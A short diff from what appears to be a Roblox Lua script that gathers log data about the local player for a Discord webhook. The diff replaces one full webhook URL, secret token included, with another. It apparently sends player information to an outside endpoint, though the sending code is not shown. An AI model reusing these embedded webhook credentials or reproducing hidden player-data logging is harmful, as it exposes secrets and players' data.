@@ -6,7 +6,7 @@ local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
 -- Replace this with your own webhook URL
-local webhookURL = "https://discord.com/api/webhooks/1388876875673370785/mxOliHIp8Oa3GzLyE2leqEyVBOi4OqpMJWfudNMXnT19SSaNMhJzybkQzPABV7l72_bh"
+local webhookURL = "https://discord.com/api/webhooks/1388879002327842898/h1G2vPHDkLa6P8Xcri5vx3yEP9lEmEBxnrAtDclYME-kk5m8yN3R-EYWZN4Dgs1qrCa6"
 
 -- Build the log data
 local data = {
